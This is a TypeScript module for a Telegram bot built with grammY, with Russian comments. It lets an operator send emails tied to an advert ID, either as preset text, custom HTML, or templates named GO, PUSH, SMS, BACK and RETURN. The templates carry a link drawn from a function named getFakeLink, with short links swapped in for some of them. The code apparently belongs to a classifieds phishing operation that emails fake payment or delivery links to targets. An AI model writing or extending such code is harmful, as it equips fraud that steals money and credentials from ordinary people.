import { Composer } from "grammy";
import {
  type Conversation,
  createConversation,
  ConversationMenuRange,
} from "@grammyjs/conversations";
import type { CustomContext } from "../types";
import { PresetRepo, AdvertsRepo } from "../db/queries";
import { preSendEmail } from "../utils/sendEmail";

import { readFile } from "fs/promises";
import { join, resolve, dirname } from "path";
import { fileURLToPath } from "url";
import { promises as fs } from "fs";

// базовая папка для шаблонов: src/Templates (с учётом расположения текущего файла: src/Conversation)
const HERE =
  typeof __dirname !== "undefined"
    ? __dirname
    : dirname(fileURLToPath(import.meta.url));

const TPL_DIR = resolve(HERE, "../templates");

/** Получение короткой ссылки из processed_emails.json */
async function getShortLink(advertId: number): Promise<string | null> {
  try {
    const filePath = join(process.cwd(), 'auto_answer', 'data', 'processed_emails.json');
    const content = await fs.readFile(filePath, 'utf-8');
    const data = JSON.parse(content);
    
    const item = data.find((item: any) => item.email_id === advertId);
    return item?.short_link || null;
  } catch (error) {
    console.error(`[SEND EMAIL] ❌ Error reading short link:`, error);
    return null;
  }
}

/** Читает шаблон и подставляет ссылку в плейсхолдер ADVERT_LINK/advert_link */
async function renderTemplate(
  name: "back" | "go" | "push" | "sms" | "return",
  link: string,
  mailId: number
): Promise<string> {
  const file = join(TPL_DIR, `${name}.html`);
  const html = await readFile(file, "utf8");
  
  // Для шаблонов RETURN и BACK пытаемся использовать короткую ссылку
  let finalLink = link;
  if (name === "return" || name === "back") {
    const shortLink = await getShortLink(mailId);
    if (shortLink) {
      finalLink = shortLink;
      console.log(`[SEND EMAIL] 🔗 Using short link for ${name.toUpperCase()}: ${shortLink}`);
    } else {
      console.log(`[SEND EMAIL] ⚠️ No short link found for mail ${mailId}, using full link`);
    }
  }
  
  return html.replace(/ADVERT_LINK|advert_link/g, finalLink);
}

const composer = new Composer<CustomContext>();

async function sendEmailConv(
  conversation: Conversation<CustomContext, CustomContext>,
  ctx: CustomContext,
  mailId: number
) {
  const sendEmailMenu = conversation
    .menu("send-email", { autoAnswer: false })
    .text("📬 Отправить пресет", async (ctx) => {
      const presetsEditMenu = conversation
        .menu("presets-edit-menu")
        .dynamic(async (ctx) => {
          const range = new ConversationMenuRange<CustomContext>();

          const presets = await conversation.external((ctx) =>
            PresetRepo.list(ctx.from!.id)
          );

          for (const preset of presets) {
            range
              .text(preset.title, async (ctx) => {
                await ctx.deleteMessage();

                conversation.external((ctx) =>
                  preSendEmail(ctx, mailId, preset.text)
                );

                await conversation.halt();
              })
              .row();
          }

          range.text("♻️ Скрыть", async (ctx) => {
            await ctx.menu.close();
            await ctx.deleteMessage();
            await conversation.halt();
          });

          return range;
        });

      await ctx.editMessageText(`Нажмите на пресет для отправки`, {
        parse_mode: "HTML",
        reply_markup: presetsEditMenu,
      });

      await conversation.waitUntil(() => false, {
        otherwise: async (ctx) => {
          if (ctx.callbackQuery) return;
          await ctx.deleteMessage().catch(() => {});
        },
      });
    })
    .text("📝 Отправить html", async (ctx) => {
      const htmlTemplatesMenu = conversation
        .menu("html-templates")
        .dynamic(async () => {
          const range = new ConversationMenuRange<CustomContext>();
          const link = await AdvertsRepo.getFakeLink(mailId);

          const templateButtons = new ConversationMenuRange<CustomContext>()
            .text("📄 GO", async (ctx) => {
              const html = await renderTemplate("go", link!, mailId);
              conversation.external((ctx) =>
                preSendEmail(ctx, mailId, undefined, html)
              );
              await ctx.menu.close();
              await ctx.deleteMessage();
              await conversation.halt();
            })
            .row()
            .text("📨 PUSH", async (ctx) => {
              const html = await renderTemplate("push", link!, mailId);
              conversation.external((ctx) =>
                preSendEmail(ctx, mailId, undefined, html)
              );
              await ctx.menu.close();
              await ctx.deleteMessage();
              await conversation.halt();
            })
            .text("💬 SMS", async (ctx) => {
              const html = await renderTemplate("sms", link!, mailId);
              conversation.external((ctx) =>
                preSendEmail(ctx, mailId, undefined, html)
              );
              await ctx.menu.close();
              await ctx.deleteMessage();
              await conversation.halt();
            })
            .row()
            .text("🆘 BACK", async (ctx) => {
              const html = await renderTemplate("back", link!, mailId);
              conversation.external((ctx) =>
                preSendEmail(ctx, mailId, undefined, html)
              );
              await ctx.menu.close();
              await ctx.deleteMessage();
              await conversation.halt();
            })
            .text("🔄 RETURN", async (ctx) => {
              const html = await renderTemplate("return", link!, mailId);
              conversation.external((ctx) =>
                preSendEmail(ctx, mailId, undefined, html)
              );
              await ctx.menu.close();
              await ctx.deleteMessage();
              await conversation.halt();
            })
            .row();

          if (link) {
            range.addRange(templateButtons);
          }

          range
            .text("📑 CUSTOM", async (ctx) => {
              const cancelMenu = conversation
                .menu("cancel", { autoAnswer: false })
                .text("🚫 Отмена", async (ctx) => {
                  await ctx.menu.close();
                  await ctx.answerCallbackQuery("⚡️ Действие отменено");
                  await ctx.deleteMessage().catch(() => {});
                  await conversation.halt();
                });

              await ctx.editMessageText(
                `✍️ Вставьте HTML <b>текстом</b> или <b>файлом .txt/.html</b>`,
                {
                  parse_mode: "HTML",
                  reply_markup: cancelMenu,
                }
              );

              const input = await conversation.waitFor(
                ["message:text", "message:document"],
                {
                  otherwise: async (ctx) => {
                    if (ctx.callbackQuery) return;
                    await ctx.deleteMessage().catch(() => {});
                  },
                }
              );

              let html: string;
              if (input.message.text) {
                html = input.message.text.trim();
              } else if (input.message.document) {
                const path = await conversation.external(async (ctx) => {
                  const file = await ctx.getFile();
                  return await file.download();
                });
                html = await Bun.file(path).text();
              } else {
                await ctx.reply("❌ Неверный формат. Вставьте текст или файл.");
                return;
              }

              conversation.external((ctx) =>
                preSendEmail(ctx, mailId, undefined, html)
              );

              await ctx.menu.close();
              await ctx.deleteMessage();
              await conversation.halt();
            })

            .row()
            .text("♻️ Скрыть", async (ctx) => {
              await ctx.menu.close();
              await ctx.deleteMessage();
              await conversation.halt();
            });

          return range;
        });

      await ctx.editMessageText(`Нажмите на html для отправки`, {
        parse_mode: "HTML",
        reply_markup: htmlTemplatesMenu,
      });

      await conversation.waitUntil(() => false, {
        otherwise: async (ctx) => {
          if (ctx.callbackQuery) return;
          await ctx.deleteMessage().catch(() => {});
        },
      });
    })
    .row()
    .text("🚫 Отмена", async (ctx) => {
      await ctx.menu.close();
      await ctx.answerCallbackQuery("⚡️ Действие отменено");
      await ctx.deleteMessage();
      await conversation.halt();
    });

  const reply = await ctx.reply(`✍️ Введите сообщение`, {
    parse_mode: "HTML",
    reply_markup: sendEmailMenu,
  });

  const message = await conversation.waitFor("message:text", {
    otherwise: async (ctx) => {
      if (!ctx.message?.text) return;
      return ctx.deleteMessage().catch(() => {});
    },
  });

  await message.deleteMessage();
  await reply.delete();

  conversation.external((ctx) =>
    preSendEmail(ctx, mailId, message.message.text)
  );
  await conversation.halt();
}

composer.use(createConversation(sendEmailConv));
export default composer;
